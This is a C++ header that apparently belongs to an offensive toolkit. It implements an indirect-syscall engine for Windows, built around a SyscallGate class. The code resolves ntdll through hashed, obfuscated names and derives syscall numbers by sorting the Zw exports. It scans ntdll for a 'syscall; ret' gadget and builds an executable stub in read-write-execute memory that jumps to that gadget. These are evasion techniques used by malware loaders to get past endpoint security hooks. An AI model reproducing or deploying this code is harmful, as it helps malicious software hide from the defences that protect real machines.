#pragma once

#include "AES8.hpp"
#include "K8_UTILS/k8_utils.hpp"
#include "Resolve8.hpp"

NOOPT
    namespace idrct_sys
    {
        static std::vector<SyscallEntry> _g_syscall_map;
        static bool _g_is_initialized = false;

        __forceinline std::wstring parse(const char* s)
        {
            size_t len = 0;
            while (*(s + len)) len++;

            std::wstring w = std::wstring(len + 1, L'\0');
            const char* src = s;
            wchar_t* dst = w.data();

            while (*src)
            {
                *dst = (wchar_t)(*src);
                src++;
                dst++;
            }
			*dst = 0;
            return w;
        }

        __forceinline void InitSyscallEngine()
        {
            if (_g_is_initialized) return;

            HMODULE hNtdll = StealthResolver::GetModuleHandleH_sys(runtime_hash_w_aes(parse(OBFUSCATE_STRING("ntdll.dll").c_str()).c_str()));
            if (!hNtdll) return;

            uint8_t* base = (uint8_t*)hNtdll;
            PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
            PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);

            uint32_t expRva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
            if (expRva == 0) return;

            PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)(base + expRva);
            uint32_t* names = (uint32_t*)(base + exp->AddressOfNames);
            uint32_t* funcs = (uint32_t*)(base + exp->AddressOfFunctions);
            uint16_t* ords  = (uint16_t*)(base + exp->AddressOfNameOrdinals);

            for (uint32_t i = 0; i < exp->NumberOfNames; ++i)
            {
                char* name = (char*)(base + names[i]);
                if (name[0] == 'Z' && name[1] == 'w') {
                    SyscallEntry entry;
                    entry.hash = runtime_hash_aes(name);
                    uint32_t funcRva = funcs[ords[i]];
                    entry.address = (uintptr_t)(base + funcRva);
                    _g_syscall_map.push_back(entry);
                }
            }

            for (size_t i = 0; i < _g_syscall_map.size() - 1; ++i) {
                for (size_t j = 0; j < _g_syscall_map.size() - i - 1; ++j) {
                    if (_g_syscall_map[j].address > _g_syscall_map[j + 1].address) {
                        SyscallEntry temp = _g_syscall_map[j];
                        _g_syscall_map[j] = _g_syscall_map[j + 1];
                        _g_syscall_map[j + 1] = temp;
                    }
                }
            }

            for (size_t i = 0; i < _g_syscall_map.size(); ++i) {
                _g_syscall_map[i].ssn = (uint32_t)i;
            }
            _g_is_initialized = true;
        }

        __forceinline uint32_t GetSSN(uint32_t funcHash) {
            if (!_g_is_initialized) InitSyscallEngine();
            for (const auto& entry : _g_syscall_map)
                if (entry.hash == funcHash) return entry.ssn;
            return (uint32_t)-1;
        }

        __forceinline uint64_t GetLateralGadget()
        {
            if (!_g_is_initialized) InitSyscallEngine();

            for(const auto& entry : _g_syscall_map) {
                unsigned char* p = (unsigned char*)entry.address;
                for(int i=0; i<32; i++)
                    if (p[i] == 0x0F && p[i+1] == 0x05 && p[i+2] == 0xC3)
                        return (uint64_t)(p + i);
            }
            return 0;
        }

        #pragma pack(push, 1)
            struct SyscallStub
            {
                uint8_t mov_r10_rcx[3] = { 0x4C, 0x8B, 0xD1 };
                uint8_t mov_eax[1]     = { 0xB8 };
                uint32_t ssn           = 0;
                uint8_t mov_r11[2]     = { 0x49, 0xBB };
                uint64_t gadget        = 0;
                uint8_t jmp_r11[3]     = { 0x41, 0xFF, 0xE3 };
            };
        #pragma pack(pop)

        typedef NTSTATUS (NTAPI * Proto_Syscall)
        (
            void* a1, void* a2, void* a3, void* a4,
            void* a5, void* a6, void* a7, void* a8, void* a9, void* a10
        );

        class SyscallGate
        {
        private:
            void* _stub_mem;
        public:
            __forceinline SyscallGate() : _stub_mem(nullptr) {}

            __forceinline bool Init() {
                if (_stub_mem) return true;

                HMODULE hNtdll = StealthResolver::GetModuleHandleH_sys(runtime_hash_w_aes(parse(OBFUSCATE_STRING("ntdll.dll").c_str()).c_str()));
                typedef NTSTATUS (NTAPI * pAlloc)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
                pAlloc fnAlloc = (pAlloc)StealthResolver::GetProcAddressH_sys(hNtdll, runtime_hash_w_aes(parse(OBFUSCATE_STRING("NtAllocateVirtualMemory").c_str()).c_str()));

                if (!fnAlloc) return false;

                SIZE_T regionSize = 4096;
                return (fnAlloc((HANDLE)-1, &_stub_mem, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE) == 0);
            }

            template <typename... Args>
            __forceinline NTSTATUS Invoke(const char* funcName, Args... args) {
                if (!_stub_mem && !Init()){
                     //std::cout << "[!] Failed to Init Stub Memory" << std::endl;
                     return 0xC0000005;
                }
                if(!funcName)
                        return (0xC0000005);
                uint32_t ssn = GetSSN(runtime_hash_aes(funcName));
                if (ssn == (uint32_t)-1) {
                    //std::cout << "[!] Failed to resolve SSN for: " << funcName << std::endl;
                    return 0xC0000005;
                }

                uint64_t gadget = GetLateralGadget();
                if (!gadget) {
                    //std::cout << "[!] Failed to find Lateral Gadget!" << std::endl;
                    return 0xC0000005;
                }

                SyscallStub* stub = (SyscallStub*)_stub_mem;
                stub->mov_r10_rcx[0] = 0x4C; stub->mov_r10_rcx[1] = 0x8B; stub->mov_r10_rcx[2] = 0xD1;
                stub->mov_eax[0] = 0xB8;
                stub->ssn = ssn;
                stub->mov_r11[0] = 0x49; stub->mov_r11[1] = 0xBB;
                stub->gadget = gadget;
                stub->jmp_r11[0] = 0x41; stub->jmp_r11[1] = 0xFF; stub->jmp_r11[2] = 0xE3;

                Proto_Syscall fn = (Proto_Syscall)_stub_mem;

                void* arg_ptrs[10] = { 0 };
                int i = 0;
                auto unpack = [&](auto arg) {
                    if (i < 10) arg_ptrs[i++] = (void*)(uintptr_t)arg;
                };
                (unpack(args), ...);
                return fn(
                    arg_ptrs[0], arg_ptrs[1], arg_ptrs[2], arg_ptrs[3],
                    arg_ptrs[4], arg_ptrs[5], arg_ptrs[6], arg_ptrs[7],
                    arg_ptrs[8], arg_ptrs[9]
                );
            }
        };

        __forceinline SyscallGate& GetGate()
        {
            static SyscallGate gate;
            return gate;
        }
    }
OPT
